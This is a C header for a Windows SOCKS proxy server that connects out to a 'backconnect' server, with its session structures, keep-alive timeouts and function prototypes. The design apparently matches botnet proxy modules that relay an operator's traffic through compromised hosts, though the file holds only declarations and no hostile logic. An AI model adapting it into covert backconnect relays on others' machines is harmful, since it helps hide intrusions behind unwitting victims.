//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// PROXY project. Version 1.3
//	
// module: proxy.h
// $Revision: 59 $
// $Date: 2014-04-22 20:44:14 +0400 (Вт, 22 апр 2014) $
// description:
//	Proxy server main header file.


#define	_KEEP_CONNECTION	TRUE	// keep the TCP/IP connection in case if the destination host is unreachable,
									//	this allows to perform multiple SOCKS requests within the single connection

#define	_USE_WORK_ITEMS		TRUE	// use system work items instead of creating threads (only for XP and later)
#define	_BC_CLIENT			TRUE	// use BcClient library to work with backconnect server


#ifndef _USE_KIP	// KIP doesn't support TCP/IP Keep Alive packets.
 #define	_ENABLE_KEEPALIVE	TRUE	// Enable keepalive option for the socket
#endif

#define	KEEPALIVE_TIME		10*1000	// The timeout, in milliseconds, with no activity until the first keep-alive
									//	packet is sent
#define	KEEPALIVE_INTERVAL	1*1000	// The interval, in milliseconds, between when successive keep-alive packets 
									//	are sent if no acknowledgement is received

#ifdef _BC_CLIENT
 #include "..\bcclient\bcclient.h"
#endif

// TCP/IP keepalive option parameters
typedef struct _TCP_KEEPALIVE
{
	BOOL	OnOff;
    ULONG	KeepaliveTime;
    ULONG	KeepaliveInterval;
} TCP_KEEPALIVE, *PTCP_KEEPALIVE;

typedef struct _PROXY_SERVER PROXY_SERVER, *PPROXY_SERVER;
typedef struct _PROXY_SESSION PROXY_SESSION, *PPROXY_SESSION;
typedef WINERROR (WINAPI* PROXY_HANDSHAKE_FUNC)(PPROXY_SESSION pSession);
typedef WINERROR (WINAPI* PROXY_VERSION_FUNC)(PPROXY_SESSION pSession, SOCKET Socket);


//
// Socks server descriptor structure
//
typedef struct _PROXY_SERVER
{
#if _DEBUG
	ULONG				Magic;
	ULONG				NumberOfSessions;
#endif
	LIST_ENTRY			SessionListHead;
	CRITICAL_SECTION 	SessionListLock;

	PCHAR				pClientId;
	PROXY_VERSION_FUNC	VersionFunction;
	PROXY_HANDSHAKE_FUNC HandshakeFunction;
	
	SOCKADDR_IN			ServerAddress;

	SOCKET				ControlSocket;		// Socket that listens the incoming connection 

	HANDLE				hShutdownEvent;		// signaled when the server is being shutting down
	HANDLE				hServerMutex;		// owned by ProxyControlThread, being released when the thread terminates
	HANDLE				hControlMutex;

	HANDLE				ControlThread;		// server main thread handle
	ULONG				ControlThreadId;	// server main thread ID
} PROXY_SERVER, *PPROXY_SERVER;

#define	PROXY_SERVER_MAGIC			'vrSP'
#define	ASSERT_PROXY_SERVER(x)		ASSERT(x->Magic == PROXY_SERVER_MAGIC)


typedef struct _PROXY_SESSION
{
#ifdef _DBG
	ULONG	Magic;
	ULONG	ReceivedFromClient;
	ULONG	SentToClient;
	ULONG	ReceivedFromTarget;
	ULONG	SentToTarget;
	ULONG	PendingToClient;
	ULONG	PendingToTarget;
#endif
	LIST_ENTRY		Entry;				// Global session list entry
	SOCKADDR_IN*	ClientAddress;	
	PPROXY_SERVER	pServer;
	PCHAR			pClientBuffer;		// Buffer to receive from client side
	PCHAR			pTargetBuffer;		// buffer to receive from server side
	SOCKET			ClientSocket;
	SOCKET			TargetSocket;
	HANDLE			Thread;
	ULONG			ThreadId;
	BOOL			bRepeatHandshake;	// TRUE to handshake any data received from a client
	UCHAR			ProxyVersion;
} PROXY_SESSION, *PPROXY_SESSION;

#define	PROXY_SESSION_MAGIC			'seSP'
#define	ASSERT_PROXY_SESSION(x)		ASSERT(x->Magic == PROXY_SESSION_MAGIC)


#define	PROXY_CONNECT_ATTEMPTS		5			// number of unsuccessfull connection attepmts before going to wait

#define	PROXY_WAIT_BC_TIMEOUT		1*60*1000	// time period to wait after unsuccessfull connection attepts (milliseconds)

#define	PROXY_HANDSHAKE_TIMEOUT		5*60*1000	// time period to wait for an incoming SOCKS handshake or KEEPALIVE packet, 
												//	after this period the server will be reconnected (milliseconds)

#define	PROXY_RECEIVE_TIMEOUT		15*1000		// timeout for a receive operation during the SOCKS handshake (milliseconds)

#define	PROXY_SESSION_BUFFER_SIZE	0x8000		// bytes



//
//	Starts the proxy server.
//
WINERROR ProxyStartServer(
	PVOID*					pServerHandle,		// receives SOCKS server handle
	SOCKADDR_IN*			pServerAddress,		// specifies BC-server address or, if no IP specified, AC-server port
	HANDLE					hServerMutex,		// handle to a mutex object wich will be held until the server stops
	LPSTR					pClientId,			// client ID string
	PROXY_VERSION_FUNC		pVersionFunction,	// version check function pointer
	PROXY_HANDSHAKE_FUNC	pHandshakeFunction	// handshake function pointer
	);


//
//	Stops the proxy server. Cleans up all structures.
//
VOID ProxyStopServer(
	PVOID	ServerHandle	// Proxy server handle returned by ProxyStartServer() function
	);


//
//	Shuts down the specified socket. Stops all pending operations.
//
VOID ProxyShutdownSocket(
	SOCKET*	pSocket
	);


//
//	Reads the specified exact amount of data from the specified socket.
//
WINERROR ProxyReadSocket(
	SOCKET	Socket,		// socket to read from
	PCHAR	Buffer,		// buffer to write data to
	LONG	bSize		// size of the buffer in bytes (number of bytes to read)
	);
